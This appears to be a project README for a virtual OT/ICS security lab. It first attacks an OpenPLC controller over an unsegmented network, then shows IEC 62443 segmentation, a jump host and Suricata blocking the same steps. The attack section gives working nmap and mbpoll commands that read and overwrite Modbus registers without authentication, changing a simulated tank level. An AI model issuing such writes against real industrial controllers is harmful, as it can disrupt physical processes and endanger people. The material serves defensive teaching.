OT/ICS Security Lab — Attack Simulation & Secure Architecture

Simulating real-world industrial control system attacks and demonstrating
how IEC 62443-based network segmentation stops them.

🎥 Watch Full Lab Demo(Waiting)

📌 What This Project Demonstrates
Most industrial control systems were built for reliability not security.
This lab proves what happens when they are left unprotected and shows exactly how to fix it.

                                      Insecure (Test 1)           Secure (Test 2 and 3)
OT Network Visible from IT                ✅ Yes                      ❌ Blocked
Direct PLC Access                         ✅ Yes                      ❌ Blocked
Modbus Write — No Auth                    ✅ Success                  ❌ Blocked
Lateral Movement                          ✅ Free                     ❌ Jump Host only
Monitoring and Alerting                   ❌ None                     ✅ Suricata active

⚠️ Why OT Security Matters
OT systems control physical infrastructure power grids, water treatment, manufacturing lines. A successful attack does not just cause data loss.
It causes physical damage.

Attack                  Year          Impact
  
Stuxnet                 2010          1,000+ Iranian centrifuges destroyed
Ukraine Power Grid      2015          225,000 homes lost power in winter
Triton/TRISIS           2017          Safety systems disabled — explosion risk
Oldsmar Water Plant     2021          NaOH levels raised 111x

Common root cause in every case: no segmentation between IT and OT.

🖥️ Lab Environment
Virtual Machines
VM Name                  Role                                  Network          IP    
Kali-Attacker            Attacker - compromised IT machine     IT Network       192.168.56.20
pfSense-Firewall         Gateway and Firewall                  All Zones        192.168.56.10 / 172.16.10.1 / 10.10.10.1
OpenPLC-Controller       Industrial PLC simulation             OT Network       10.10.10.10
NodeRED-SCADA            SCADA Dashboard                       OT Network       10.10.10.20
JumpHost-Bastion         DMZ Bastion, authorized access only   DMZ              172.16.10.10

Lab Snapshots

Snapshot                       Purpose
ICS_LAB_INSECURE_BASELINE      Flat network, no rules — Test 1 attack simulation
ICS_LAB_WORKING_IDS_SECURE     Segmented, IDS active — Test 2 defense validation

!!!
pfSense is present in both scenarios.
In the insecure baseline it has no rules configured — default allow policy.
This reflects a very common real-world situation:
the firewall exists but was never properly configured.
In the secure scenario, segmentation rules and Suricata IDS are fully active.
Same infrastructure. Two completely different security postures.


🌐 Network Architecture
IP Schema
Zone              Subnet             pfSense Interface     IP
WAN               10.0.2.0/24        em0                   DHCP — VirtualBox NAT
IT Network LAN    192.168.56.0/24    em1                   192.168.56.10
DMZ OPT1          172.16.10.0/24     em2                   172.16.10.1
OT Network OPT2   10.10.10.0/24      em3                   10.10.10.1

Purdue Model Mapping
Level 4-5  →  IT Network   192.168.56.x   Kali-Attacker
Level 3.5  →  DMZ          172.16.10.x    JumpHost-Bastion
Level 1-2  →  OT Network   10.10.10.x     OpenPLC-Controller
                                           NodeRED-SCADA

🔴 PART 1 — Insecure Architecture
Snapshot: ICS_LAB_INSECURE_BASELINE
IT Network                              OT Network
192.168.56.x  ────────────────────────► 10.10.10.x

Kali-Attacker ────────────────────────► OpenPLC-Controller
192.168.56.20                           10.10.10.10
                                        NodeRED-SCADA
                                        10.10.10.20
!!!                                        
No firewall rules. No segmentation. No monitoring.
Direct access from IT to OT every device reachable.

Step 1 — Network Discovery
bashnmap -sn 10.10.10.0/24
Nmap scan report for 10.10.10.1   Host is up (0.00145s latency)
Nmap scan report for 10.10.10.10  Host is up (0.0022s latency)
Nmap scan report for 10.10.10.20  Host is up (0.0027s latency)
3 hosts up scanned in 4.05 seconds

OT network fully visible from IT.

MITRE ATT&CK ICS: T0846 — Network Service Scanning

(Screen Shot)

Step 2 — Service Enumeration
nmap -sV 10.10.10.10
22/tcp    open   SSH       OpenSSH 9.6p1
8080/tcp  open   HTTP      Werkzeug 2.3.7 — PLC Web Interface
8443/tcp  open   HTTPS     Werkzeug 2.3.7
502/tcp   open   Modbus    ← Industrial control protocol

MITRE ATT&CK ICS: T0886 — Remote Services

(Screen Shot)

Step 3 — Industrial Protocol Detection
nmap -p 502 10.10.10.10
502/tcp open mbap
Modbus TCP confirmed no authentication, no encryption.
Designed in 1979. Security was never part of the protocol.

MITRE ATT&CK ICS: T0885 — Commonly Used Port

(Screen Shot)

Step 4 — PLC Register Read
mbpoll -m tcp -a 1 -r 1024 -c 3 10.10.10.10
[1024]: 0
[1025]: 3    ← Live tank level
[1026]: 0
No credentials required. Live process data exposed.

MITRE ATT&CK ICS: T0802 — Automated Collection
T0882 — Data from Control System

(Screen Shot)
(Screen Shot)

Step 5 — PLC Register Write — Attack
mbpoll -m tcp -a 1 -r 1026 10.10.10.10 10
Written 1 references.
NodeRED-SCADA Dashboard:
  Tank Level BEFORE:  3
  Tank Level AFTER:  10  ← Manipulated from IT network

MITRE ATT&CK ICS: T0831 — Modify Controller Tasking
T0855 — Unauthorized Command Message
T0836 — Modify Process Variables

(Screen Shot)
(Screen Shot)

Step 6 — Verify Manipulation
mbpoll -m tcp -a 1 -r 1024 -c 3 10.10.10.10
[1024]: 0
[1025]: 10   ← Value changed and persists
[1026]: 0

(Screen Shot)

Test 1 Outcome
Full control of an industrial process from the IT network.
No authentication was bypassed — there was no authentication to bypass.
Attack completed in under 2 minutes using only standard tools.

🟢 PART 2 — Secure Architecture
Snapshot: ICS_LAB_WORKING_IDS_SECURE
Based on IEC 62443 Security Level SL-2 protection against intentional attacks with low to moderate resources.

Security Controls Implemented

Control                 Implementation

Security Zones          IT — DMZ — OT Network
Conduits                pfSense rules IT→DMZ and DMZ→OT
Default Deny            All traffic blocked unless explicitly permitted
Least Privilege         Only required protocols allowed per zone
Zero Trust              No implicit trust between zones
Visibility              Suricata IDS active on OT segment


Secure Network Design
ZERO TRUST — Default Deny — Explicit Allow — No Flat Network
  
IT Network          DMZ                 OT Network
192.168.56.x  ──►  172.16.10.x  ──►     10.10.10.x

Kali-Attacker       JumpHost-Bastion    OpenPLC-Controller
192.168.56.20       172.16.10.10        10.10.10.10

pfSense LAN         pfSense DMZ         NodeRED-SCADA
192.168.56.10       172.16.10.1         10.10.10.20
                                        pfSense OT
                                        10.10.10.1
          VISIBILITY LAYER
          Suricata IDS — pfSense Logs — SIEM


Allowed Traffic — Conduit Rules
Source              Destination        Protocol               Decision
IT 192.168.56.x     DMZ 172.16.10.x    HTTPS 443              ✅ Allowed
DMZ 172.16.10.x     OT 10.10.10.x      SSH/RDP via Jump Host  ✅ Allowed
IT 192.168.56.x     OT 10.10.10.x      Any                    ❌ DENY
IT 192.168.56.x     OT 10.10.10.x      Modbus TCP 502         ❌ DENY

✅ PART 3 — Security Validation

Test 2 — Network Segmentation
nmap -sn 10.10.10.0/24
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) in 0.03 seconds

✅ OT network completely invisible from IT
nmap -p 502,8080 10.10.10.10
Note: Host seems really down.
Nmap done: 1 IP address (0 hosts up) in 3.09 seconds

✅ Direct IT to OT access blocked

T0846 — BLOCKED — T0886 — BLOCKED

(Screen Shot)
(Screen Shot)

Modbus Write — Blocked
mbpoll -m tcp -a 1 -r 1026 10.10.10.10 10
Command fails — No response
No change in OpenPLC-Controller or NodeRED-SCADA

✅ T0831 — BLOCKED — T0855 — BLOCKED — T0836 — BLOCKED
Show Image

Controlled Access via JumpHost-Bastion
bashssh jumphost@172.16.10.10
# Welcome to Ubuntu 24.04.4 LTS
# IPv4: 172.16.10.10 ✅

ping 10.10.10.10
# 5 packets transmitted, 5 received, 0% packet loss ✅

nmap -p 502 10.10.10.10
# 502/tcp open mbap ✅ monitored and logged

✅ Access only through authorized DMZ path
✅ All traffic monitored by Suricata

(Screen Shot)
(Screen Shot)

Suricata IDS — Active Detection
03/15 02:37:46  TCP  172.16.10.10:39682 → 10.10.10.10:8080
SURICATA TLS invalid record type  [1:2230002]

03/15 02:37:46  TCP  10.10.10.10:8080 → 172.16.10.10:39682
SURICATA Applayer Detect protocol only one direction  [1:2260002]

✅ Network activity visible, traceable, and alerting

T0842 — Network Traffic Analysis — ACTIVE
T0887 — Detect Anomalous Activity — ACTIVE

(Screen Shot)
(Screen Shot)

📊 Full Results — Before vs After
Attack Vector       Test 1 Insecure        Test 2 Secure
Nmap OT Scan        ✅ 3 hosts found      ❌ 0 hosts — BLOCKED
Direct PLC Access   ✅ Ports open         ❌ Filtered
Modbus Read         ✅ Data exposed       ❌ No response
Modbus Write        ✅ Tank 3 → 10        ❌ No response
Lateral Movement    ✅ Free               ❌ Jump Host only
Monitoring          ❌ Zero visibility    ✅ Suricata active

📋 MITRE ATT&CK for ICS — Full Mapping
Technique                    ID       Test 1             Test 2
Network Service Scanning     T0846    ✅ Success        ❌ Blocked
Remote Services              T0886    ✅ Success        ❌ Blocked
Exploit Public-Facing App    T0814    ✅ Success        ❌ Blocked
Automated Collection         T0802    ✅ Success        ❌ Blocked
Data from Control System     T0882    ✅ Success        ❌ Blocked
Modify Controller Tasking    T0831    ✅ Success        ❌ Blocked
Unauthorized Command         T0855    ✅ Success        ❌ Blocked
Modify Process Variables     T0836    ✅ Success        ❌ Blocked
Loss of Control              T0829    ✅ Success        ❌ Blocked
Network Traffic Analysis     T0842    ❌ No visibility  ✅ Active

🛠️ Tools and Technologies
Virtualization:   VirtualBox
Firewall:         pfSense 2.8.1
Attacker OS:      Kali Linux 2025.4
PLC Simulation:   OpenPLC Runtime
SCADA:            Node-RED Dashboard
IDS:              Suricata — pfSense OT IDS
Modbus Client:    mbpoll
Network Recon:    Nmap 7.95
Protocol:         Modbus TCP Port 502
Standard:         IEC 62443 — Purdue Model

📚 Standards and Frameworks

Standard            	  Application
IEC 62443               Zone/Conduit design — SL-2 target — FR1-FR7
Purdue Model            Network level architecture L0 to L5
MITRE ATT&CK for ICS    Attack technique mapping and validation
Zero Trust              Default deny — no implicit trust between zones
NIS2 Directive          EU critical infrastructure compliance

📁 Repository Structure
OT-ICS-Security-Lab/
│
├── README.md
│
├── screenshots/
│   ├── 01_insecure_nmap_discovery.png
│   ├── 02_insecure_service_scan.png
│   ├── 03_insecure_modbus_detection.png
│   ├── 04_insecure_modbus_read.png
│   ├── 05_insecure_scada_before.png
│   ├── 06_insecure_modbus_write.png
│   ├── 07_insecure_scada_after.png
│   ├── 08_insecure_verify.png
│   ├── 09_secure_nmap_blocked.png
│   ├── 10_secure_port_blocked.png
│   ├── 11_secure_modbus_blocked.png
│   ├── 12_jumphost_access.png
│   ├── 13_jumphost_plc_reachable.png
│   ├── 14_suricata_alerts.png
│   └── 15_pfsense_firewall_rules.png
│
└── presentation/
    └── OT_Security_Architecture_Presentation.pdf

👤 About
Fatih Ünal
Mechatronics Engineer — OT/ICS Cybersecurity
9+ years hands-on experience at Rockwell Automation,
KUKA Robotics, and Advantech working directly with
PLCs, SCADA systems, and industrial networks across 
manufacturing sectors.
Now applying that operational knowledge to securing
the exact systems I spent years deploying.
